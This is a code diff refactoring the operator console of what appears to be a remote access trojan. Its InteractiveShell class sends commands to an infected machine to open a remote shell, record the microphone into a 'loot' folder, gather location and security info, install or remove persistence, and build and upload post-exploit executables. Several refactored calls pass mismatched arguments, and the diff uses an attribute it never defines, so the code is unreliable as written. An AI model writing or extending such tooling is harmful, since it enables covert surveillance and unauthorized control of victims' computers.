@@ -1,5 +1,4 @@
-from .system import System
-from .options import *
+from cli.options import Options
 from core.server.async_comm import send_data, recv_data
 from core.utils.paths import ensure_project_dir, get_project_path
 from colorama import Fore
@@ -7,22 +6,46 @@ from agent.post_exploit.post_exploit_controller import PostExploitController
 from api.connection_protocol import create_task
 import random, os, simplejson
 from api.session_api import SessionAPI
+from cli.system import System
 
 post_exploit_controller = PostExploitController()
 
-class InteractiveShell():
+class InteractiveShell:
     def __init__(self, session_id):
         self.session_id = session_id
         self.session_api = SessionAPI()
 
-    def send_task(self, conn, address, module, action, args=None):
+    def send_task(self, module, action, args=None):
         """Send a JSON task to the agent using the connection protocol."""
-        session_id = f"{address[0]}:{address[1]}" if address else ""
-        task = create_task(session_id, module, action, args or {})
+        task = create_task(self.session_id, module, action, args or {})
         self.session_api.send_task(self.session_id, task)
 
+    def start(self):
+        while True:
+            System.clear_screen()
+            System.printheader()
+            System.printShellOptions()
+            command = System.input(4)
+            if command == "1":
+                self.shell()
+            # elif command == "2":
+            #     self.upload()
+            # elif command == "3":
+            #     self.download()
+            # elif command == "4":
+            #     self.screenshot()
+            # elif command == "5":
+            #     self.cam()
+            elif command == "6":
+                self.mic()
+            elif command == "7":
+                self.secinfo()
+            elif command == "8":
+                self.geo()
+            elif command == "9":
+                break
 
-    def send_notification(self, conn, address):
+    def send_notification(self):
         title = "Title"
         message = "Message"
         app = "App"
@@ -39,7 +62,7 @@ class InteractiveShell():
                 app = System.input(9)
             elif command == "4":
                 try:
-                    send_task(conn, address, "notification", "send", {"title":title, "message":message, "app":app})
+                    self.send_task("notification", "send", {"title":title, "message":message, "app":app})
                 except Exception as e:
                     print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
                     input("OK")
@@ -67,62 +90,62 @@ class InteractiveShell():
             input("OK")
             print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
 
-    def geo(self, conn, address):
-        send_task(conn, address, "geo", "get")
+    def geo(self, conn=None):
+        self.send_task(self.session_id, "geo", "get")
         try:
-            resp = json_receive(conn)
+            resp = self.json_receive(self.conn)
             data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
         except Exception:
             data = {}
         print(Fore.LIGHTCYAN_EX + "[+] Location Info:\n", data)
         input("OK")
 
-    def secinfo(self, conn, address):
-        send_task(conn, address, "secinfo", "get")
+    def secinfo(self, conn=None, address=None):
+        self.send_task(self.session_id, "secinfo", "get")
         try:
-            resp = json_receive(conn)
+            resp = self.json_receive(self.conn)
             data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
         except Exception:
             data = {}
         Options.print_security_info_text(data)
         input("OK")
 
-    def sysinfo(self, conn, address):
-        send_task(conn, address, "sysinfo", "get")
+    def sysinfo(self, conn=None, address=None):
+        self.send_task(self.session_id, "sysinfo", "get")
         try:
-            resp = json_receive(conn)
+            resp = self.json_receive(self.conn)
             data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
         except Exception:
             data = {}
         print(Options.get_system_info_text(data))
         input("OK")
 
-    def mic(self, conn, address):
+    def mic(self, conn=None, address=None):
         records_dir = ensure_project_dir("storage", "loot", "records")
         number = random.randint(0, 9999999)
         print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
-        send_data(conn, b"MODE_MIC")
-        data = recv_data(conn, decode=False)
+        send_data(self.conn, b"MODE_MIC")
+        data = recv_data(self.conn, decode=False)
         output_path = os.path.join(records_dir, f"record{number}.wav")
         with open(output_path, "wb") as f:
             f.write(data)
         print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: {output_path}")
         input("OK")
-    def getInput(self, conn):
-        send_data(conn, b"SHELLINFO")
-        return recv_data(conn)
-    def shell(self, conn, address):
-        send_data(conn, b"MODE_SHELL")
+    def getInput(self, conn=None):
+        send_data(conn or self.conn, b"SHELLINFO")
+        return recv_data(conn or self.conn)
+    def shell(self, conn=None, address=None):
+        send_data(conn or self.conn, b"MODE_SHELL")
         try:
             while True:
-                send_data(conn, b"SHELLINFO")
-                prompt_text = recv_data(conn)
+                send_data(conn or self.conn, b"SHELLINFO")
+                prompt_text = recv_data(conn or self.conn)
                 cmd = input(prompt_text)
                 if not cmd.strip():
                     continue
                 if cmd == 'exit':
                     System.clear_screen()
-                    send_data(conn, b"exit")
+                    send_data(conn or self.conn, b"exit")
                     break
                 send_data(conn, cmd.encode())
                 if cmd == 'clear':
@@ -201,18 +224,18 @@ class InteractiveShell():
         input("OK")
 
     def backdoor(self, conn, address):
-        send_task(conn, address, "System", "backdoor")
+        self.send_task(conn, address, "System", "backdoor")
         try:
-            resp = json_receive(conn)
+            resp = self.json_receive(conn)
         except Exception:
             resp = None
         print(Fore.LIGHTCYAN_EX + f"[+] Created Persistence")
         input("OK")
 
     def delete(self, conn, address):
-        send_task(conn, address, "System", "delete")
+        self.send_task(conn, address, "System", "delete")
         try:
-            resp = json_receive(conn)
+            resp = self.json_receive(conn)
         except Exception:
             resp = None
         print(Fore.LIGHTCYAN_EX + "[+] Destroyed Persistence")
@@ -252,7 +275,7 @@ class InteractiveShell():
             input("OK")
             return
 
-        placeholder_values = edit_template_placeholders(module_entry)
+        placeholder_values = self.edit_template_placeholders(module_entry)
         print(Fore.LIGHTCYAN_EX + "[+] Building post-exploit module...")
         payload_path = post_exploit_controller.build_temp_payload(module_entry, placeholder_values, build_type="exe")
         if not payload_path:
@@ -267,8 +290,8 @@ class InteractiveShell():
             remote_name = f"{module_entry['command'].lower()}.exe"
             send_data(conn, remote_name.encode())
             recv_data(conn)
-            upload(conn, address, payload_path, usename=False, send_mode=False)
-            response = recv_data(conn)
+            self.upload(conn, address, payload_path, usename=False, send_mode=False)
+            response = self.recv_data(conn)
             if response == "REGISTERED":
                 print(Fore.LIGHTGREEN_EX + f"[+] Registered post-exploit: {module_entry['command']}")
             else:
@@ -379,10 +402,10 @@ class InteractiveShell():
 
             action = System.input(14).strip()
             if action == "1":
-                post_exploit_upload(conn, address, module_entry)
+                self.post_exploit_upload(conn, address, module_entry)
                 break
             elif action == "2" and post_exploit_controller.module_has_controller(module_entry):
-                post_exploit_controller_session(conn, address, module_entry, server_host)
+                self.post_exploit_controller_session(conn, address, module_entry, server_host)
                 break
             elif action == "9":
                 break
